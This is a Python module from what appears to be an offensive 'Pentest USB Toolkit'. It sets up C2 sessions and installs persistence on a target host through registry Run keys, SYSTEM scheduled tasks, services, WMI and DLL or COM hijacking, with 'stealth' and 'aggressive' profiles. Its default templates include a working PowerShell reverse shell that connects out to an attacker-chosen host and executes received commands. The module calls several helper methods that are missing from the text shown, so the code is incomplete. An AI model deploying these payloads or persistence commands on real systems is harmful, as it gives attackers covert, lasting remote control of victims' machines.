#!/usr/bin/env python3
"""
Persistence Module - Pentest USB Toolkit

This module implements comprehensive persistence mechanisms including
Empire, Sliver integration, C2 server management, and stealth maintenance.

Author: Pentest USB Team
Version: 1.0.0
"""

import os
import sys
import json
import logging
import subprocess
import time
import base64
import hashlib
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum

# Internal imports
sys.path.append(str(Path(__file__).parent.parent.parent))
from core.utils.logging_handler import setup_logger
from core.utils.error_handler import handle_error
from core.security.consent_manager import ConsentManager
from core.security.stealth_engine import StealthExecutor
from core.db.sqlite_manager import DatabaseManager


class PersistenceType(Enum):
    """Types of persistence mechanisms."""
    REGISTRY = "registry"
    STARTUP = "startup"
    SERVICE = "service"
    SCHEDULED_TASK = "scheduled_task"
    WMI = "wmi"
    LOGON_SCRIPT = "logon_script"
    DLL_HIJACKING = "dll_hijacking"
    COM_HIJACKING = "com_hijacking"
    BITSADMIN = "bitsadmin"
    SCHTASKS = "schtasks"
    CRON = "cron"
    SYSTEMD = "systemd"
    SSH_KEY = "ssh_key"


class C2Framework(Enum):
    """C2 framework types."""
    EMPIRE = "empire"
    SLIVER = "sliver"
    COBALT_STRIKE = "cobalt_strike"
    METASPLOIT = "metasploit"
    POSHC2 = "poshc2"
    CUSTOM = "custom"


@dataclass
class PersistenceMechanism:
    """Data structure for persistence mechanisms."""
    name: str
    type: PersistenceType
    target: str
    payload: str
    trigger: str
    location: str
    active: bool = True
    created_time: Optional[str] = None
    last_check: Optional[str] = None
    stealth_score: float = 1.0


@dataclass
class C2Session:
    """Data structure for C2 sessions."""
    session_id: str
    framework: C2Framework
    target: str
    callback_url: str
    encryption: str
    last_checkin: Optional[str] = None
    active: bool = True
    persistence_methods: List[str] = None


class PersistenceModule:
    """Main class for persistence operations."""
    
    def __init__(self, target: str, config: Dict[str, Any] = None):
        self.target = target
        self.config = config or {}
        self.logger = setup_logger(__name__)
        self.consent_manager = ConsentManager()
        self.stealth_engine = StealthExecutor()
        self.db_manager = DatabaseManager()
        
        # Persistence tracking
        self.active_persistence: List[PersistenceMechanism] = []
        self.c2_sessions: List[C2Session] = []
        
        # Tool paths
        self.tool_paths = {
            'empire': self._get_tool_path('empire'),
            'sliver': self._get_tool_path('sliver'),
            'poshc2': self._get_tool_path('poshc2'),
            'metasploit': self._get_tool_path('metasploit'),
            'powershell': self._get_powershell_path(),
            'cmd': self._get_cmd_path()
        }
        
        # Payload templates
        self.payload_templates = self._load_payload_templates()
        
        self.logger.info(f"Initialized PersistenceModule for target: {target}")

    def _get_tool_path(self, tool_name: str) -> str:
        """Get the appropriate tool path based on OS."""
        base_path = Path(__file__).parent.parent.parent / "tools" / "binaries"
        
        if sys.platform.startswith('win'):
            return str(base_path / "windows" / f"{tool_name}.exe")
        elif sys.platform.startswith('linux'):
            return str(base_path / "linux" / tool_name)
        else:  # macOS
            return str(base_path / "macos" / tool_name)

    def _get_powershell_path(self) -> str:
        """Get PowerShell path."""
        if sys.platform.startswith('win'):
            return "powershell.exe"
        else:
            return "pwsh"  # PowerShell Core

    def _get_cmd_path(self) -> str:
        """Get command prompt path."""
        if sys.platform.startswith('win'):
            return "cmd.exe"
        else:
            return "/bin/bash"

    def _load_payload_templates(self) -> Dict[str, str]:
        """Load payload templates from configuration."""
        templates_path = Path(__file__).parent.parent.parent / "data" / "templates" / "persistence"
        templates = {}
        
        if templates_path.exists():
            for template_file in templates_path.glob("*.txt"):
                try:
                    with open(template_file, 'r') as f:
                        templates[template_file.stem] = f.read()
                except Exception as e:
                    self.logger.error(f"Error loading template {template_file}: {e}")
        
        # Default templates if files don't exist
        if not templates:
            templates = self._get_default_templates()
        
        return templates

    def _get_default_templates(self) -> Dict[str, str]:
        """Get default payload templates."""
        return {
            'powershell_reverse_shell': '''
$client = New-Object System.Net.Sockets.TCPClient("{host}",{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
            '''.strip(),
            
            'registry_persistence': '''
New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "{name}" -Value "{payload}" -PropertyType String -Force
            '''.strip(),
            
            'scheduled_task': '''
schtasks /create /tn "{name}" /tr "{payload}" /sc onlogon /ru "NT AUTHORITY\\SYSTEM" /f
            '''.strip()
        }

    @handle_error
    def establish_persistence(self, methods: List[str] = None, 
                            framework: str = "empire",
                            profile: str = "default") -> Dict[str, Any]:
        """
        Main method to establish persistence on target system.
        
        Args:
            methods: List of persistence methods to use
            framework: C2 framework to use
            profile: Persistence profile (stealth, default, aggressive)
            
        Returns:
            Dictionary containing persistence results
        """
        self.logger.info("Establishing persistence mechanisms")
        
        # Verify consent and authorization
        if not self.consent_manager.verify_authorization(self.target, "persistence"):
            raise PermissionError("No authorization for persistence on target")
        
        if methods is None:
            methods = self._get_default_methods(profile)
        
        results = {
            'target': self.target,
            'framework': framework,
            'methods_attempted': methods,
            'successful_persistence': [],
            'failed_persistence': [],
            'c2_sessions': [],
            'stealth_score': 0.0,
            'execution_time': 0
        }
        
        start_time = time.time()
        
        try:
            # Setup C2 infrastructure
            self.logger.info(f"Setting up {framework} C2 infrastructure")
            c2_setup = self._setup_c2_infrastructure(framework)
            
            if c2_setup['success']:
                results['c2_sessions'].append(c2_setup['session'])
                
                # Deploy persistence mechanisms
                for method in methods:
                    self.logger.info(f"Deploying persistence method: {method}")
                    
                    persistence_result = self._deploy_persistence_method(
                        method, framework, c2_setup['session']
                    )
                    
                    if persistence_result['success']:
                        results['successful_persistence'].append(persistence_result)
                        self.active_persistence.append(persistence_result['mechanism'])
                    else:
                        results['failed_persistence'].append(persistence_result)
                
                # Validate persistence mechanisms
                self.logger.info("Validating persistence mechanisms")
                validation_results = self._validate_persistence()
                results['validation'] = validation_results
                
                # Calculate overall stealth score
                results['stealth_score'] = self._calculate_stealth_score()
            
            else:
                results['error'] = f"Failed to setup {framework} C2 infrastructure"
        
        except Exception as e:
            self.logger.error(f"Error establishing persistence: {e}")
            results['error'] = str(e)
        
        finally:
            results['execution_time'] = time.time() - start_time
            
        self.logger.info(f"Persistence establishment completed in {results['execution_time']:.2f} seconds")
        return results

    def _get_default_methods(self, profile: str) -> List[str]:
        """Get default persistence methods based on profile."""
        methods = {
            'stealth': ['registry', 'wmi', 'com_hijacking'],
            'default': ['registry', 'scheduled_task', 'service', 'startup'],
            'aggressive': [
                'registry', 'scheduled_task', 'service', 'startup',
                'wmi', 'logon_script', 'dll_hijacking', 'bitsadmin'
            ]
        }
        return methods.get(profile, methods['default'])

    def maintain_persistence(self) -> Dict[str, Any]:
        """Maintain existing persistence mechanisms."""
        self.logger.info("Maintaining persistence mechanisms")
        
        maintenance_results = {
            'mechanisms_maintained': [],
            'mechanisms_restored': [],
            'mechanisms_failed': [],
            'c2_sessions_active': len([s for s in self.c2_sessions if s.active])
        }
        
        # Check and maintain each mechanism
        for mechanism in self.active_persistence:
            try:
                if self._check_persistence_mechanism(mechanism):
                    maintenance_results['mechanisms_maintained'].append(mechanism.name)
                    mechanism.last_check = time.strftime("%Y-%m-%d %H:%M:%S")
                else:
                    # Try to restore the mechanism
                    restore_result = self._restore_persistence_mechanism(mechanism)
                    
                    if restore_result['success']:
                        maintenance_results['mechanisms_restored'].append(mechanism.name)
                        mechanism.active = True
                        mechanism.last_check = time.strftime("%Y-%m-%d %H:%M:%S")
                    else:
                        maintenance_results['mechanisms_failed'].append(mechanism.name)
                        mechanism.active = False
                        
            except Exception as e:
                self.logger.error(f"Error maintaining {mechanism.name}: {e}")
                maintenance_results['mechanisms_failed'].append(mechanism.name)
        
        return maintenance_results

    def cleanup_persistence(self) -> Dict[str, Any]:
        """Clean up all persistence mechanisms."""
        self.logger.info("Cleaning up persistence mechanisms")
        
        cleanup_results = {
            'mechanisms_removed': [],
            'mechanisms_failed': [],
            'c2_sessions_terminated': []
        }
        
        # Remove persistence mechanisms
        for mechanism in self.active_persistence:
            try:
                remove_result = self._remove_persistence_mechanism(mechanism)
                
                if remove_result['success']:
                    cleanup_results['mechanisms_removed'].append(mechanism.name)
                    mechanism.active = False
                else:
                    cleanup_results['mechanisms_failed'].append(mechanism.name)
                    
            except Exception as e:
                self.logger.error(f"Error removing {mechanism.name}: {e}")
                cleanup_results['mechanisms_failed'].append(mechanism.name)
        
        # Terminate C2 sessions
        for session in self.c2_sessions:
            try:
                terminate_result = self._terminate_c2_session(session)
                
                if terminate_result['success']:
                    cleanup_results['c2_sessions_terminated'].append(session.session_id)
                    session.active = False
                    
            except Exception as e:
                self.logger.error(f"Error terminating session {session.session_id}: {e}")
        
        return cleanup_results


def main():
    """Main function for testing the module."""
    import argparse
    
    parser = argparse.ArgumentParser(description="Persistence Module")
    parser.add_argument("--target", required=True, help="Target system IP/hostname")
    parser.add_argument("--framework", choices=['empire', 'sliver', 'poshc2', 'metasploit'], 
                       default='empire', help="C2 framework")
    parser.add_argument("--profile", choices=['stealth', 'default', 'aggressive'], 
                       default='default', help="Persistence profile")
    parser.add_argument("--methods", nargs='+', help="Specific methods to use")
    parser.add_argument("--action", choices=['establish', 'maintain', 'cleanup'], 
                       default='establish', help="Action to perform")
    
    args = parser.parse_args()
    
    # Initialize module
    persistence_module = PersistenceModule(args.target)
    
    if args.action == 'establish':
        results = persistence_module.establish_persistence(
            methods=args.methods,
            framework=args.framework,
            profile=args.profile
        )
        
        print(f"\n=== Persistence Establishment Results ===")
        print(f"Target: {results['target']}")
        print(f"Framework: {results['framework']}")
        print(f"Successful persistence: {len(results['successful_persistence'])}")
        print(f"Stealth score: {results['stealth_score']:.2f}")
        
    elif args.action == 'maintain':
        results = persistence_module.maintain_persistence()
        print(f"\n=== Persistence Maintenance Results ===")
        print(f"Mechanisms maintained: {len(results['mechanisms_maintained'])}")
        
    elif args.action == 'cleanup':
        results = persistence_module.cleanup_persistence()
        print(f"\n=== Persistence Cleanup Results ===")
        print(f"Mechanisms removed: {len(results['mechanisms_removed'])}")


if __name__ == "__main__":
    main()